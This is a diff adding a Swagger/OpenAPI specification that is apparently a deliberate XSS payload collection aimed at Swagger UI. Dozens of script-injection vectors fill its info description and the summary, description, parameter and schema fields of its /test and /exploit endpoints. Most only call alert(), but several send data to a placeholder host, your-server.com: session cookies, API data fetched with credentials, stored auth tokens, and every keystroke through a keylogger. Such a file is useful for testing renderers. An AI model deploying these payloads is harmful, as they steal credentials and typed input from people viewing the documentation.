@@ -1,0 +1,159 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: XSS Payload Collection by Proxy
+  description: |
+    <h1>XSS Testing Suite</h1>
+    
+    <!-- Event handlers alternativi -->
+    <img src="x" onload="alert('XSS-onload')" />
+    <svg onload="alert('XSS-svg')" />
+    <body onpageshow="alert('XSS-pageshow')" />
+    <details open ontoggle="alert('XSS-toggle')" />
+    <input autofocus onfocus="alert('XSS-focus')" />
+    <video controls onloadstart="alert('XSS-video')" />
+    <audio controls onloadstart="alert('XSS-audio')" />
+    
+    <!-- JavaScript URLs -->
+    <a href="javascript:alert('XSS-href')">Click me</a>
+    <iframe src="javascript:alert('XSS-iframe')"></iframe>
+    
+    <!-- CSS injection -->
+    <div style="background-image: url('javascript:alert(1)')"></div>
+    <x style="expression(alert('XSS-css'))"></x>
+    
+    <!-- Meta refresh -->
+    <meta http-equiv="refresh" content="0;url=javascript:alert('XSS-meta')" />
+    
+    <!-- Script encoding -->
+    <script>alert&#40;'XSS-encoded'&#41;</script>
+    <script>alert\u0028'XSS-unicode'\u0029</script>
+    
+    <!-- Form hijacking -->
+    <form action="javascript:alert('XSS-form')">
+      <input type="submit" value="Click" />
+    </form>
+    
+    <!-- SVG vectors -->
+    <svg><script>alert('XSS-svg-script')</script></svg>
+    <svg onload="alert('XSS-svg-onload')"></svg>
+    <svg><foreignObject><script>alert('XSS-foreign')</script></foreignObject></svg>
+    
+    <!-- Data URIs -->
+    <iframe src="data:text/html,<script>alert('XSS-data')</script>"></iframe>
+    <object data="data:text/html,<script>alert('XSS-object')</script>"></object>
+    
+    <!-- Markdown bypasses -->
+    [XSS](javascript:alert('XSS-markdown'))
+    ![XSS](javascript:alert('XSS-img'))
+    <javascript:alert('XSS-direct')>
+    
+    <!-- Advanced payloads -->
+    <script>
+      // Session hijacking
+      fetch('https://your-server.com/steal', {
+        method: 'POST',
+        body: document.cookie
+      });
+      
+      // API enumeration
+      fetch('/api/users', {
+        credentials: 'include'
+      }).then(r => r.text()).then(data => {
+        fetch('https://your-server.com/api-data', {
+          method: 'POST',
+          body: data
+        });
+      });
+    </script>
+    
+    <!-- Alternative event handlers -->
+    <marquee onstart="alert('XSS-marquee')">XSS</marquee>
+    <select onfocus="alert('XSS-select')">
+      <option>XSS</option>
+    </select>
+    <textarea onfocus="alert('XSS-textarea')"></textarea>
+    
+    <!-- HTML5 vectors -->
+    <keygen autofocus onfocus="alert('XSS-keygen')" />
+    <embed src="javascript:alert('XSS-embed')" />
+    <object type="text/html" data="javascript:alert('XSS-object-js')"></object>
+    
+    <!-- Unicode bypasses -->
+    <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+    
+    <!-- Template literals -->
+    <script>alert`XSS-template`</script>
+    
+    <!-- DOM clobbering -->
+    <form id="test"><input name="action" value="javascript:alert('XSS-clobber')"></form>
+    
+    <!-- Event delegation -->
+    <div onclick="alert('XSS-click')">Click anywhere</div>
+    
+    This payload tests multiple XSS vectors in Swagger UI.
+
+paths:
+  /test:
+    get:
+      summary: Test endpoint with XSS in summary
+      description: |
+        <script>alert('XSS-description')</script>
+        More XSS testing in description field
+      parameters:
+        - name: test
+          in: query
+          description: |
+            <script>alert('XSS-param')</script>
+            XSS in parameter description
+          type: string
+      responses:
+        '200':
+          description: |
+            <script>alert('XSS-response')</script>
+            XSS in response description
+          schema:
+            type: object
+            properties:
+              message:
+                type: string
+                description: |
+                  <script>alert('XSS-schema')</script>
+                  XSS in schema description
+  
+  /exploit:
+    post:
+      summary: |
+        <svg onload="alert('XSS-summary')"></svg>
+        XSS in summary field
+      description: |
+        <h2>Advanced XSS Payload</h2>
+        <script>
+          // Comprehensive exploitation
+          console.log('XSS executed successfully');
+          
+          // Steal authentication tokens
+          if (localStorage.getItem('token')) {
+            fetch('https://your-server.com/token', {
+              method: 'POST',
+              body: JSON.stringify({
+                token: localStorage.getItem('token'),
+                url: window.location.href
+              })
+            });
+          }
+          
+          // Keylogger
+          document.addEventListener('keydown', function(e) {
+            fetch('https://your-server.com/keylog', {
+              method: 'POST',
+              body: JSON.stringify({
+                key: e.key,
+                target: e.target.tagName
+              })
+            });
+          });
+        </script>
+      responses:
+        '200':
+          description: Success
